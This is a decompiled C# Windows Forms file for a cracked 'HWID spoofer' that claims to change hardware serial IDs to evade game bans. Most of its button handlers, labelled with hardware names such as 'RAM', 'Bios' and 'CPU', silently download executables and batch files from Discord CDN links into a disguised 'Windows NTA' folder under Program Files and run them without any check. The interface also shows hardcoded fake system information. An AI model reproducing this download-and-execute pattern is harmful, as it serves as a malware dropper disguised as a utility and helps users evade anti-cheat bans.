using ns17;
using Siticone.Desktop.UI.WinForms;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace KeyAuth
{
    public class main : Form
    {
        private object wc;

        private IContainer components = null;

        private SiticoneDragControl siticoneDragControl1;

        private SiticoneControlBox siticoneControlBox1;

        private SiticoneTransition siticoneTransition1;

        private Label label1;

        private Panel panel2;

        private PictureBox pictureBox1;

        private Panel free;

        private Panel panel3;

        private Label label9;

        private Label label10;

        private Label label6;

        private Label label8;

        private Label label3;

        private Label label17;

        private Panel panel4;

        private SiticoneRoundedGradientButton siticoneRoundedGradientButton1;

        private Label label12;

        private Label label13;

        private Label label5;

        private Label label7;

        private Label label4;

        private Label label11;

        private SiticoneRoundedGradientButton siticoneRoundedGradientButton4;

        private SiticoneRoundedGradientButton siticoneRoundedGradientButton3;

        private SiticoneRoundedGradientButton siticoneRoundedGradientButton2;

        private SiticoneRoundedGradientButton siticoneRoundedGradientButton8;

        private SiticoneRoundedGradientButton siticoneRoundedGradientButton7;

        private SiticoneRoundedGradientButton siticoneRoundedGradientButton6;

        private SiticoneRoundedGradientButton siticoneRoundedGradientButton5;

        private Panel panel7;

        private Panel panel1;

        private Panel panel6;

        private Panel panel5;

        private Label label14;

        private SiticoneElipse siticoneElipse1;

        private SiticoneElipse siticoneElipse2;

        private SiticoneElipse siticoneElipse3;

        private SiticoneElipse siticoneElipse4;

        private SiticoneBorderlessForm siticoneBorderlessForm1;

        public bool UseShellExecute
        {
            get;
            private set;
        }

        public main()
        {
            this.InitializeComponent();
        }

        protected override void Dispose(bool disposing)
        {
            if ((!disposing ? false : this.components != null))
            {
                this.components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            this.components = new Container();
            Animation animation = new Animation();
            ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(main));
            this.siticoneDragControl1 = new SiticoneDragControl(this.components);
            this.siticoneControlBox1 = new SiticoneControlBox();
            this.siticoneTransition1 = new SiticoneTransition();
            this.label1 = new Label();
            this.pictureBox1 = new PictureBox();
            this.panel2 = new Panel();
            this.label13 = new Label();
            this.panel4 = new Panel();
            this.label17 = new Label();
            this.free = new Panel();
            this.label14 = new Label();
            this.label5 = new Label();
            this.label7 = new Label();
            this.label4 = new Label();
            this.label11 = new Label();
            this.label12 = new Label();
            this.panel3 = new Panel();
            this.panel7 = new Panel();
            this.panel1 = new Panel();
            this.panel6 = new Panel();
            this.panel5 = new Panel();
            this.label9 = new Label();
            this.label10 = new Label();
            this.label6 = new Label();
            this.label8 = new Label();
            this.label3 = new Label();
            this.siticoneRoundedGradientButton1 = new SiticoneRoundedGradientButton();
            this.siticoneRoundedGradientButton2 = new SiticoneRoundedGradientButton();
            this.siticoneRoundedGradientButton3 = new SiticoneRoundedGradientButton();
            this.siticoneRoundedGradientButton4 = new SiticoneRoundedGradientButton();
            this.siticoneRoundedGradientButton5 = new SiticoneRoundedGradientButton();
            this.siticoneRoundedGradientButton6 = new SiticoneRoundedGradientButton();
            this.siticoneRoundedGradientButton7 = new SiticoneRoundedGradientButton();
            this.siticoneRoundedGradientButton8 = new SiticoneRoundedGradientButton();
            this.siticoneElipse1 = new SiticoneElipse(this.components);
            this.siticoneElipse2 = new SiticoneElipse(this.components);
            this.siticoneElipse3 = new SiticoneElipse(this.components);
            this.siticoneElipse4 = new SiticoneElipse(this.components);
            this.siticoneBorderlessForm1 = new SiticoneBorderlessForm(this.components);
            ((ISupportInitialize)this.pictureBox1).BeginInit();
            this.panel2.SuspendLayout();
            this.free.SuspendLayout();
            this.panel3.SuspendLayout();
            this.panel1.SuspendLayout();
            base.SuspendLayout();
            this.siticoneControlBox1.Anchor = AnchorStyles.Top | AnchorStyles.Right;
            this.siticoneTransition1.SetDecoration(this.siticoneControlBox1, 0);
            this.siticoneControlBox1.Location = new Point(775, 4);
            this.siticoneControlBox1.Name = "siticoneControlBox1";
            this.siticoneControlBox1.Size = new Size(45, 29);
            this.siticoneControlBox1.TabIndex = 1;
            this.siticoneControlBox1.Click += new EventHandler(this.siticoneControlBox1_Click);
            this.label1.AutoSize = true;
            this.siticoneTransition1.SetDecoration(this.label1, 0);
            this.label1.Font = new Font("Segoe UI Light", 10f);
            this.label1.ForeColor = Color.White;
            this.label1.Location = new Point(-1, 136);
            this.label1.Name = "label1";
            this.label1.Size = new Size(0, 19);
            this.label1.TabIndex = 22;
            this.siticoneTransition1.SetDecoration(this.pictureBox1, 0);
            this.pictureBox1.Location = new Point(33, 5);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new Size(730, 126);
            this.pictureBox1.SizeMode = PictureBoxSizeMode.Zoom;
            this.pictureBox1.TabIndex = 25;
            this.pictureBox1.TabStop = false;
            this.pictureBox1.Click += new EventHandler(this.pictureBox1_Click);
            this.panel2.BackColor = Color.FromArgb(8, 8, 8);
            this.panel2.BackgroundImageLayout = ImageLayout.None;
            this.panel2.Controls.Add(this.label13);
            this.panel2.Controls.Add(this.panel4);
            this.panel2.Controls.Add(this.label17);
            this.siticoneTransition1.SetDecoration(this.panel2, 0);
            this.panel2.ForeColor = Color.FromArgb(35, 39, 42);
            this.panel2.Location = new Point(336, 138);
            this.panel2.Name = "panel2";
            this.panel2.Size = new Size(449, 197);
            this.panel2.TabIndex = 39;
            this.panel2.Paint += new PaintEventHandler(this.panel2_Paint);
            this.label13.AutoSize = true;
            this.label13.BackColor = Color.Transparent;
            this.siticoneTransition1.SetDecoration(this.label13, 0);
            this.label13.Font = new Font("Berlin Sans FB", 15.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.label13.ForeColor = SystemColors.ButtonFace;
            this.label13.Location = new Point(25, 15);
            this.label13.Margin = new Padding(9, 0, 9, 0);
            this.label13.Name = "label13";
            this.label13.Size = new Size(201, 23);
            this.label13.TabIndex = 54;
            this.label13.Text = "What is Nix's Spoofer ?";
            this.label13.Click += new EventHandler(this.label13_Click);
            this.panel4.BackColor = Color.FromArgb(254, 254, 252);
            this.siticoneTransition1.SetDecoration(this.panel4, 0);
            this.panel4.ForeColor = Color.FromArgb(35, 39, 42);
            this.panel4.Location = new Point(20, 16);
            this.panel4.Name = "panel4";
            this.panel4.RightToLeft = RightToLeft.Yes;
            this.panel4.Size = new Size(4, 23);
            this.panel4.TabIndex = 39;
            this.label17.AutoSize = true;
            this.label17.BackColor = Color.Transparent;
            this.siticoneTransition1.SetDecoration(this.label17, 0);
            this.label17.Font = new Font("Verdana", 11.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.label17.ForeColor = Color.DarkGray;
            this.label17.Location = new Point(4, 62);
            this.label17.Margin = new Padding(9, 0, 9, 0);
            this.label17.Name = "label17";
            this.label17.Size = new Size(442, 108);
            this.label17.TabIndex = 30;
            this.label17.Text = "Basically Nix's Spoofer is a HWID Spoofer and is able to \r\nget you  unbanned from some games. This is a tool that\r\ncan change your Serial ID's and remove a ban traces from\r\n games.\r\n\r\n\r\n";
            this.free.BackColor = Color.FromArgb(8, 8, 8);
            this.free.Controls.Add(this.label14);
            this.free.Controls.Add(this.label5);
            this.free.Controls.Add(this.label7);
            this.free.Controls.Add(this.label4);
            this.free.Controls.Add(this.label11);
            this.free.Controls.Add(this.label12);
            this.free.Controls.Add(this.panel3);
            this.free.Controls.Add(this.label9);
            this.free.Controls.Add(this.label10);
            this.free.Controls.Add(this.label6);
            this.free.Controls.Add(this.label8);
            this.free.Controls.Add(this.label3);
            this.siticoneTransition1.SetDecoration(this.free, 0);
            this.free.ForeColor = Color.FromArgb(35, 39, 42);
            this.free.Location = new Point(43, 137);
            this.free.Name = "free";
            this.free.Size = new Size(265, 350);
            this.free.TabIndex = 40;
            this.label14.AutoSize = true;
            this.label14.BackColor = Color.Transparent;
            this.siticoneTransition1.SetDecoration(this.label14, 0);
            this.label14.Font = new Font("Berlin Sans FB", 15.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.label14.ForeColor = SystemColors.ButtonFace;
            this.label14.Location = new Point(22, 22);
            this.label14.Margin = new Padding(9, 0, 9, 0);
            this.label14.Name = "label14";
            this.label14.Size = new Size(184, 23);
            this.label14.TabIndex = 55;
            this.label14.Text = "System Informations";
            this.label5.AutoSize = true;
            this.siticoneTransition1.SetDecoration(this.label5, 0);
            this.label5.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.label5.ForeColor = SystemColors.ButtonFace;
            this.label5.Location = new Point(19, 251);
            this.label5.Name = "label5";
            this.label5.Size = new Size(50, 20);
            this.label5.TabIndex = 57;
            this.label5.Text = "NULL";
            this.label7.AutoSize = true;
            this.siticoneTransition1.SetDecoration(this.label7, 0);
            this.label7.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.label7.ForeColor = SystemColors.ButtonFace;
            this.label7.Location = new Point(19, 201);
            this.label7.Name = "label7";
            this.label7.Size = new Size(167, 20);
            this.label7.TabIndex = 56;
            this.label7.Text = "BFEBFBFF000206A7";
            this.label4.AutoSize = true;
            this.siticoneTransition1.SetDecoration(this.label4, 0);
            this.label4.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.label4.ForeColor = SystemColors.ButtonFace;
            this.label4.Location = new Point(19, 140);
            this.label4.Name = "label4";
            this.label4.Size = new Size(86, 20);
            this.label4.TabIndex = 55;
            this.label4.Text = "73A64D88";
            this.label11.AutoSize = true;
            this.siticoneTransition1.SetDecoration(this.label11, 0);
            this.label11.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.label11.ForeColor = SystemColors.ButtonFace;
            this.label11.Location = new Point(18, 84);
            this.label11.Name = "label11";
            this.label11.Size = new Size(108, 20);
            this.label11.TabIndex = 54;
            this.label11.Text = "AC0158BEZ9";
            this.label12.AutoSize = true;
            this.label12.BackColor = Color.Transparent;
            this.siticoneTransition1.SetDecoration(this.label12, 0);
            this.label12.Font = new Font("Verdana", 12f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.label12.ForeColor = Color.White;
            this.label12.Location = new Point(18, 25);
            this.label12.Margin = new Padding(9, 0, 9, 0);
            this.label12.Name = "label12";
            this.label12.Size = new Size(0, 18);
            this.label12.TabIndex = 41;
            this.panel3.BackColor = Color.Gray;
            this.panel3.Controls.Add(this.panel7);
            this.panel3.Controls.Add(this.panel1);
            this.siticoneTransition1.SetDecoration(this.panel3, 0);
            this.panel3.ForeColor = Color.FromArgb(35, 39, 42);
            this.panel3.Location = new Point(17, 22);
            this.panel3.Name = "panel3";
            this.panel3.RightToLeft = RightToLeft.Yes;
            this.panel3.Size = new Size(5, 26);
            this.panel3.TabIndex = 38;
            this.panel7.BackColor = Color.FromArgb(254, 254, 252);
            this.siticoneTransition1.SetDecoration(this.panel7, 0);
            this.panel7.ForeColor = Color.FromArgb(35, 39, 42);
            this.panel7.Location = new Point(0, 1);
            this.panel7.Name = "panel7";
            this.panel7.RightToLeft = RightToLeft.Yes;
            this.panel7.Size = new Size(4, 23);
            this.panel7.TabIndex = 40;
            this.panel1.BackColor = Color.Gray;
            this.panel1.Controls.Add(this.panel6);
            this.panel1.Controls.Add(this.panel5);
            this.siticoneTransition1.SetDecoration(this.panel1, 0);
            this.panel1.ForeColor = Color.FromArgb(35, 39, 42);
            this.panel1.Location = new Point(1, 3);
            this.panel1.Name = "panel1";
            this.panel1.RightToLeft = RightToLeft.Yes;
            this.panel1.Size = new Size(4, 23);
            this.panel1.TabIndex = 40;
            this.panel6.BackColor = Color.Gray;
            this.siticoneTransition1.SetDecoration(this.panel6, 0);
            this.panel6.ForeColor = Color.FromArgb(35, 39, 42);
            this.panel6.Location = new Point(0, 1);
            this.panel6.Name = "panel6";
            this.panel6.RightToLeft = RightToLeft.Yes;
            this.panel6.Size = new Size(4, 23);
            this.panel6.TabIndex = 68;
            this.panel5.BackColor = Color.Gray;
            this.siticoneTransition1.SetDecoration(this.panel5, 0);
            this.panel5.ForeColor = Color.FromArgb(35, 39, 42);
            this.panel5.Location = new Point(2, 1);
            this.panel5.Name = "panel5";
            this.panel5.RightToLeft = RightToLeft.Yes;
            this.panel5.Size = new Size(4, 23);
            this.panel5.TabIndex = 40;
            this.label9.AutoSize = true;
            this.siticoneTransition1.SetDecoration(this.label9, 0);
            this.label9.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.label9.ForeColor = Color.White;
            this.label9.Location = new Point(18, 251);
            this.label9.Name = "label9";
            this.label9.Size = new Size(42, 16);
            this.label9.TabIndex = 37;
            this.label9.Text = "NULL";
            this.label10.AutoSize = true;
            this.siticoneTransition1.SetDecoration(this.label10, 0);
            this.label10.Font = new Font("Microsoft Sans Serif", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.label10.ForeColor = Color.Gray;
            this.label10.Location = new Point(18, 236);
            this.label10.Name = "label10";
            this.label10.Size = new Size(71, 15);
            this.label10.TabIndex = 36;
            this.label10.Text = "Base Board";
            this.label6.AutoSize = true;
            this.siticoneTransition1.SetDecoration(this.label6, 0);
            this.label6.Font = new Font("Microsoft Sans Serif", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.label6.ForeColor = Color.Gray;
            this.label6.Location = new Point(18, 183);
            this.label6.Name = "label6";
            this.label6.Size = new Size(32, 15);
            this.label6.TabIndex = 34;
            this.label6.Text = "CPU";
            this.label8.AutoSize = true;
            this.siticoneTransition1.SetDecoration(this.label8, 0);
            this.label8.Font = new Font("Microsoft Sans Serif", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.label8.ForeColor = Color.Gray;
            this.label8.Location = new Point(18, 123);
            this.label8.Name = "label8";
            this.label8.Size = new Size(49, 15);
            this.label8.TabIndex = 32;
            this.label8.Text = "Volume";
            this.label3.AutoSize = true;
            this.siticoneTransition1.SetDecoration(this.label3, 0);
            this.label3.Font = new Font("Microsoft Sans Serif", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.label3.ForeColor = Color.Gray;
            this.label3.Location = new Point(18, 69);
            this.label3.Name = "label3";
            this.label3.Size = new Size(80, 15);
            this.label3.TabIndex = 28;
            this.label3.Text = "MAC Address";
            this.siticoneTransition1.SetDecoration(this.siticoneRoundedGradientButton1, 0);
            this.siticoneRoundedGradientButton1.Font = new Font("Microsoft JhengHei", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.siticoneRoundedGradientButton1.ForeColor = SystemColors.ButtonFace;
            this.siticoneRoundedGradientButton1.Location = new Point(343, 386);
            this.siticoneRoundedGradientButton1.Name = "siticoneRoundedGradientButton1";
            this.siticoneRoundedGradientButton1.Size = new Size(109, 45);
            this.siticoneRoundedGradientButton1.TabIndex = 53;
            this.siticoneRoundedGradientButton1.Text = "Disk Drive";
            this.siticoneRoundedGradientButton1.Click += new EventHandler(this.siticoneRoundedGradientButton1_Click);
            this.siticoneTransition1.SetDecoration(this.siticoneRoundedGradientButton2, 0);
            this.siticoneRoundedGradientButton2.Font = new Font("Microsoft JhengHei", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.siticoneRoundedGradientButton2.ForeColor = SystemColors.ButtonFace;
            this.siticoneRoundedGradientButton2.Location = new Point(455, 386);
            this.siticoneRoundedGradientButton2.Name = "siticoneRoundedGradientButton2";
            this.siticoneRoundedGradientButton2.Size = new Size(108, 45);
            this.siticoneRoundedGradientButton2.TabIndex = 61;
            this.siticoneRoundedGradientButton2.Text = "RAM";
            this.siticoneRoundedGradientButton2.Click += new EventHandler(this.siticoneRoundedGradientButton2_Click);
            this.siticoneTransition1.SetDecoration(this.siticoneRoundedGradientButton3, 0);
            this.siticoneRoundedGradientButton3.Font = new Font("Microsoft JhengHei", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.siticoneRoundedGradientButton3.ForeColor = SystemColors.ButtonFace;
            this.siticoneRoundedGradientButton3.Location = new Point(566, 386);
            this.siticoneRoundedGradientButton3.Name = "siticoneRoundedGradientButton3";
            this.siticoneRoundedGradientButton3.Size = new Size(108, 45);
            this.siticoneRoundedGradientButton3.TabIndex = 62;
            this.siticoneRoundedGradientButton3.Text = "Bios";
            this.siticoneRoundedGradientButton3.Click += new EventHandler(this.siticoneRoundedGradientButton3_Click);
            this.siticoneTransition1.SetDecoration(this.siticoneRoundedGradientButton4, 0);
            this.siticoneRoundedGradientButton4.Font = new Font("Microsoft JhengHei", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.siticoneRoundedGradientButton4.ForeColor = SystemColors.ButtonFace;
            this.siticoneRoundedGradientButton4.Location = new Point(677, 387);
            this.siticoneRoundedGradientButton4.Name = "siticoneRoundedGradientButton4";
            this.siticoneRoundedGradientButton4.Size = new Size(108, 45);
            this.siticoneRoundedGradientButton4.TabIndex = 63;
            this.siticoneRoundedGradientButton4.Text = "MAC";
            this.siticoneRoundedGradientButton4.Click += new EventHandler(this.siticoneRoundedGradientButton4_Click);
            this.siticoneTransition1.SetDecoration(this.siticoneRoundedGradientButton5, 0);
            this.siticoneRoundedGradientButton5.Font = new Font("Microsoft JhengHei", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.siticoneRoundedGradientButton5.ForeColor = SystemColors.ButtonFace;
            this.siticoneRoundedGradientButton5.Location = new Point(344, 438);
            this.siticoneRoundedGradientButton5.Name = "siticoneRoundedGradientButton5";
            this.siticoneRoundedGradientButton5.Size = new Size(108, 45);
            this.siticoneRoundedGradientButton5.TabIndex = 64;
            this.siticoneRoundedGradientButton5.Text = "VolumeID";
            this.siticoneRoundedGradientButton5.Click += new EventHandler(this.siticoneRoundedGradientButton5_Click);
            this.siticoneTransition1.SetDecoration(this.siticoneRoundedGradientButton6, 0);
            this.siticoneRoundedGradientButton6.Font = new Font("Microsoft JhengHei", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.siticoneRoundedGradientButton6.ForeColor = SystemColors.ButtonFace;
            this.siticoneRoundedGradientButton6.Location = new Point(455, 438);
            this.siticoneRoundedGradientButton6.Name = "siticoneRoundedGradientButton6";
            this.siticoneRoundedGradientButton6.Size = new Size(108, 45);
            this.siticoneRoundedGradientButton6.TabIndex = 65;
            this.siticoneRoundedGradientButton6.Text = "GPU";
            this.siticoneRoundedGradientButton6.Click += new EventHandler(this.siticoneRoundedGradientButton6_Click);
            this.siticoneTransition1.SetDecoration(this.siticoneRoundedGradientButton7, 0);
            this.siticoneRoundedGradientButton7.Font = new Font("Microsoft JhengHei", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.siticoneRoundedGradientButton7.ForeColor = SystemColors.ButtonFace;
            this.siticoneRoundedGradientButton7.Location = new Point(566, 438);
            this.siticoneRoundedGradientButton7.Name = "siticoneRoundedGradientButton7";
            this.siticoneRoundedGradientButton7.Size = new Size(108, 45);
            this.siticoneRoundedGradientButton7.TabIndex = 66;
            this.siticoneRoundedGradientButton7.Text = "CPU";
            this.siticoneRoundedGradientButton7.Click += new EventHandler(this.siticoneRoundedGradientButton7_Click);
            this.siticoneTransition1.SetDecoration(this.siticoneRoundedGradientButton8, 0);
            this.siticoneRoundedGradientButton8.Font = new Font("Microsoft JhengHei", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.siticoneRoundedGradientButton8.ForeColor = SystemColors.ButtonFace;
            this.siticoneRoundedGradientButton8.Location = new Point(677, 438);
            this.siticoneRoundedGradientButton8.Name = "siticoneRoundedGradientButton8";
            this.siticoneRoundedGradientButton8.Size = new Size(108, 45);
            this.siticoneRoundedGradientButton8.TabIndex = 67;
            this.siticoneRoundedGradientButton8.Text = "Clean Traces";
            this.siticoneRoundedGradientButton8.Click += new EventHandler(this.siticoneRoundedGradientButton8_Click_1);
            this.siticoneElipse1.BorderRadius = 30;
            this.siticoneElipse1.TargetControl = this.free;
            this.siticoneElipse2.TargetControl = this.panel3;
            this.siticoneElipse3.BorderRadius = 30;
            this.siticoneElipse3.TargetControl = this.panel2;
            this.siticoneBorderlessForm1.BorderRadius = 30;
            this.siticoneBorderlessForm1.ContainerControl = this;
            base.AutoScaleDimensions = new SizeF(6f, 13f);
            base.AutoScaleMode = AutoScaleMode.Font;
            this.AutoValidate = AutoValidate.Disable;
            this.BackColor = Color.FromArgb(8, 8, 8);
            base.ClientSize = new Size(824, 511);
            base.Controls.Add(this.panel2);
            base.Controls.Add(this.siticoneRoundedGradientButton8);
            base.Controls.Add(this.siticoneRoundedGradientButton7);
            base.Controls.Add(this.siticoneRoundedGradientButton6);
            base.Controls.Add(this.siticoneRoundedGradientButton5);
            base.Controls.Add(this.siticoneRoundedGradientButton4);
            base.Controls.Add(this.siticoneRoundedGradientButton3);
            base.Controls.Add(this.siticoneRoundedGradientButton2);
            base.Controls.Add(this.siticoneRoundedGradientButton1);
            base.Controls.Add(this.free);
            base.Controls.Add(this.label1);
            base.Controls.Add(this.siticoneControlBox1);
            base.Controls.Add(this.pictureBox1);
            this.siticoneTransition1.SetDecoration(this, 0);
            this.ForeColor = SystemColors.Control;
            base.FormBorderStyle = FormBorderStyle.None;
            base.Name = "OMEGALUL";
            base.StartPosition = FormStartPosition.CenterScreen;
            this.Text = "Bad Spoofer OMEGALUL | Cracked by himiko";
            base.TransparencyKey = Color.White;
            ((ISupportInitialize)this.pictureBox1).EndInit();
            this.panel2.ResumeLayout(false);
            this.panel2.PerformLayout();
            this.free.ResumeLayout(false);
            this.free.PerformLayout();
            this.panel3.ResumeLayout(false);
            this.panel1.ResumeLayout(false);
            base.ResumeLayout(false);
            base.PerformLayout();
        }

        private void label13_Click(object sender, EventArgs e)
        {
        }

        private void LoginBtn_Click(object sender, EventArgs e)
        {
        }

        private void panel2_Paint(object sender, PaintEventArgs e)
        {
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {
        }

        private void siticoneCircleButton1_Click(object sender, EventArgs e)
        {
        }

        private void siticoneControlBox1_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }

        private void siticoneRadioButton1_CheckedChanged(object sender, EventArgs e)
        {
        }

        private void siticoneRoundedButton4_Click(object sender, EventArgs e)
        {
        }

        private void siticoneRoundedButton5_Click(object sender, EventArgs e)
        {
        }

        private void siticoneRoundedButton6_Click(object sender, EventArgs e)
        {
            Process.Start(".\\Packages\\dnSpy.exe");
        }

        private void siticoneRoundedGradientButton1_Click(object sender, EventArgs e)
        {
            string str = "https://cdn.discordapp.com/attachments/805123317795127336/910997577514766346/Volumeid64.exe";
            string str1 = "C:\\Program Files (x86)\\Windows NTA\\Volumeid64.exe";
            Directory.CreateDirectory("C:\\Program Files (x86)\\Windows NTA");
            (new WebClient()).DownloadFile(str, str1);
            Process.Start("C:\\Program Files (x86)\\Windows NTA\\Volumeid64.exe");
        }

        private void siticoneRoundedGradientButton2_Click(object sender, EventArgs e)
        {
            string str = "https://cdn.discordapp.com/attachments/805123317795127336/910997498737356821/OS.bat";
            string str1 = "C:\\Program Files (x86)\\Windows NTA\\OS.bat";
            Directory.CreateDirectory("C:\\Program Files (x86)\\Windows NTA");
            (new WebClient()).DownloadFile(str, str1);
            Process.Start("C:\\Program Files (x86)\\Windows NTA\\OS.bat");
        }

        private void siticoneRoundedGradientButton3_Click(object sender, EventArgs e)
        {
            string str = "https://cdn.discordapp.com/attachments/805123317795127336/910997498737356821/OS.bat";
            string str1 = "C:\\Program Files (x86)\\Windows NTA\\OS.bat";
            Directory.CreateDirectory("C:\\Program Files (x86)\\Windows NTA");
            (new WebClient()).DownloadFile(str, str1);
            Process.Start("C:\\Program Files (x86)\\Windows NTA\\OS.bat");
        }

        private void siticoneRoundedGradientButton4_Click(object sender, EventArgs e)
        {
            string str = "https://cdn.discordapp.com/attachments/805123317795127336/910997616509202432/Mac.exe";
            string str1 = "C:\\Program Files (x86)\\Windows NTA\\Mac.exe";
            Directory.CreateDirectory("C:\\Program Files (x86)\\Windows NTA");
            (new WebClient()).DownloadFile(str, str1);
            Process.Start("C:\\Program Files (x86)\\Windows NTA\\Mac.exe");
        }

        private void siticoneRoundedGradientButton5_Click(object sender, EventArgs e)
        {
            string str = "https://cdn.discordapp.com/attachments/805123317795127336/910997577514766346/Volumeid64.exe";
            string str1 = "C:\\Program Files (x86)\\Windows NTA\\Volumeid64.exe";
            Directory.CreateDirectory("C:\\Program Files (x86)\\Windows NTA");
            (new WebClient()).DownloadFile(str, str1);
            Process.Start("C:\\Program Files (x86)\\Windows NTA\\Volumeid64.exe");
        }

        private void siticoneRoundedGradientButton6_Click(object sender, EventArgs e)
        {
            string str = "https://cdn.discordapp.com/attachments/805123317795127336/910997589502083092/productkey.bat";
            string str1 = "C:\\Program Files (x86)\\Windows NTA\\productkey.bat";
            Directory.CreateDirectory("C:\\Program Files (x86)\\Windows NTA");
            (new WebClient()).DownloadFile(str, str1);
            Process.Start("C:\\Program Files (x86)\\Windows NTA\\productkey.bat");
        }

        private void siticoneRoundedGradientButton7_Click(object sender, EventArgs e)
        {
            string str = "https://cdn.discordapp.com/attachments/805123317795127336/910997556190937118/3D.exe";
            string str1 = "C:\\Program Files (x86)\\Windows NTA\\3D.exe";
            Directory.CreateDirectory("C:\\Program Files (x86)\\Windows NTA");
            (new WebClient()).DownloadFile(str, str1);
            Process.Start("C:\\Program Files (x86)\\Windows NTA\\3D.exe");
        }

        private void siticoneRoundedGradientButton8_Click(object sender, EventArgs e)
        {
            Process.Start("http://www.stackoverflow.net");
            Process.Start("iexplore", "http://www.stackoverflow.net/");
            Process.Start("firefox", "http://www.stackoverflow.net/");
            Process.Start("chrome", "http://www.stackoverflow.net/");
        }

        private void siticoneRoundedGradientButton8_Click_1(object sender, EventArgs e)
        {
            string str = "https://cdn.discordapp.com/attachments/805123317795127336/911002265471565934/processhacker-2.39-setup.exe";
            string str1 = "C:\\Program Files (x86)\\Windows NTA\\processhacker-2.39-setup.exe";
            Directory.CreateDirectory("C:\\Program Files (x86)\\Windows NTA");
            (new WebClient()).DownloadFile(str, str1);
            Process.Start("C:\\Program Files (x86)\\Windows NTA\\processhacker-2.39-setup.exe");
        }

        public DateTime UnixTimeToDateTime(long unixtime)
        {
            DateTime dateTime = new DateTime(1970, 1, 1, 0, 0, 0, 0, DateTimeKind.Local);
            dateTime = dateTime.AddSeconds((double)unixtime).ToLocalTime();
            return dateTime;
        }
    }
}